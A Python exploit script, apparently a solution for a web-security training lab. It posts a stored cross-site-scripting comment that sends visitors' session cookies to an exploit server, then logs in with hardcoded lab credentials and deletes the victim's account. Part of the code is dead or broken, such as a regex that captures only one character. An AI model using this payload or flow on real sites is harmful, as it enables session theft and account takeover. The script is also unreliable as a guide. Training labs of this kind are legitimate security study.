import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
comment_url = burp_url + '/post/comment'

response = requests.get(burp_url)
match = re.search(r"<a id='exploit-link' class='button' target='_blank' href='(https://exploit-[0-9a-f]+\.exploit-server\.net)'>", response.text)
exploit_server = match.group(1)

xss = f'<script>document.location=\''+exploit_server+'/\'+document.cookie</script>'
#exploit_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8", "responseBody": response_body, "formAction": "STORE"}
#requests.post(exploit_server, data=exploit_data)


comment_data = {"postId": "3", "comment": xss, "name": "11", "email": "1@1.com", "website": ''}
requests.post(comment_url, data=comment_data)

response = requests.get(burp_url+'/post?postId=3')
match = re.search(r"[a-zA-Z0-9]", response.text)
encoded_pass = match.group(0)

get_encoded_url = exploit_server + '/log'

# There is allwyas the same solution so this above is usless...
session = requests.Session()
burp_data = {"username": "carlos", "password": "onceuponatime"}
session.post(burp_url +'/login', data=burp_data)
session.post(burp_url+'/my-account/delete')
burp_data = {"password": "onceuponatime"}
session.post(burp_url+ '/my-account/delete', data=burp_data)
